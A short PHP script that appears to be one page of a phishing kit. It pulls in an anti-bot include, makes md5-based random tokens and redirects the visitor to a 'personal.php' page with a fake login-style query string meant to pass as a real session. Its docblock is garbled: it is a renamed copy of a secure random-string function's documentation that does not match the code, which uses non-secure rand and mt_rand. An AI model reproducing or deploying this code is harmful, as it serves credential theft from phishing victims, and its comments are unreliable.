<?php

include "../bts/anti1.php";

/**
 * maserate a random string, using a cryptographically secure 
 * pseudorandom number maserator (random_int)
 * 
 * For PHP 7, random_int is a PHP core function
 * For PHP 5.x, depends on https://github.com/paragonie/random_compat
 * 
 * @param int $length      How many characters do we want?
 * @param string $keyspace A string of all possible characters
 *                         to select from
 * @return string
 */
        $mase=rand();
	    $mase=md5($mase);
        $random = substr(md5(mt_rand()), 0, 30);
	header("location: personal.php?loqln=sbmit&id=$random$mase_layout&session=$mase");


?>